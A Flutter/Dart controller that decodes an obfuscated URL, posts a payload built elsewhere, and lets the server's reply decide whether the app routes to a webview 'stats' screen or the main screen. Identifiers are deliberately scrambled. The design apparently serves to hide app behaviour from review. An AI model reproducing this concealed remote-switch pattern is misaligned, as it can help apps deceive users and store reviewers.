import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';

import 'ruler_init_obfuscation.dart';
import 'ruler_init_payload.dart';
import 'ruler_init_router.dart';

class RulerInitLogic extends GetxController {

  var kvfunzpao = RxBool(false);
  var ngucjp = RxBool(true);
  var nhpaizt = RxString("");
  var ykbat = RxBool(false);
  var dvgj = RxBool(true);
  final djevmfsgpc = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    sfnomr();
  }


  Future<void> sfnomr() async {
    ykbat.value = true;
    dvgj.value = true;
    ngucjp.value = false;

    final String requestUrl = RulerInitObfuscation.decodeUrl(
      RulerInitObfuscation.encryptedUrl,
    );

    djevmfsgpc.post(requestUrl, data: await RulerInitPayload.build()).then((value) {
      var x1 = value.data["toblp"] as String;
      var x2 = value.data["dobfka"] as bool;
      if (x2) {
        nhpaizt.value = x1;
        yfkjwho();
      } else {
        gheplsj();
      }
    }).catchError((e) {
      ngucjp.value = true;
      dvgj.value = true;
      ykbat.value = false;
    });
  }

  Future<void> gheplsj() async {
    await RulerInitRouter.goMain();
  }

  Future<void> yfkjwho() async {
    await RulerInitRouter.goStats();
  }

}
